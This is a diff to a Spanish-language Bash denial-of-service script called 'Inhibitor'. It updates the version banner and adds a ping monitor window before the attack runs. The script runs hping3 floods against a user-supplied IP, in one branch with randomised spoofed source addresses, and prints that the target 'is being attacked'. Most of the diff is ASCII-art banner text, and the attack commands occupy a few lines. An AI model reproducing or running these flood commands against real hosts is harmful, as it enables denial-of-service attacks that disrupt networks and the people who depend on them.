@@ -9,7 +9,7 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
@@ -35,7 +35,7 @@ if [ $opc2 = y ]
 		echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 		echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 		echo "                              __________________________________________________"					
-		echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+		echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
 		echo "          -------------------------------------------------------------------------------------------"
 		echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 		echo "          -------------------------------------------------------------------------------------------"
@@ -47,6 +47,8 @@ if [ $opc2 = y ]
 		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
 		echo "========================================================================================="
 		echo
+		sudo gnome-terminal -- sudo ping $ip
+		sleep 2
 		sudo hping3 --rand-source -V $ip --flood
 	else
 		clear
@@ -58,7 +60,7 @@ if [ $opc2 = y ]
 		echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 		echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 		echo "                              __________________________________________________"					
-		echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+		echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
 		echo "          -------------------------------------------------------------------------------------------"
 		echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 		echo "          -------------------------------------------------------------------------------------------"
@@ -70,6 +72,8 @@ if [ $opc2 = y ]
 		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
 		echo "========================================================================================="
 		echo
+		sudo gnome-terminal -- sudo ping $ip
+		sleep 2
 		sudo hping3 -V $ip --flood
 fi
 sleep 1
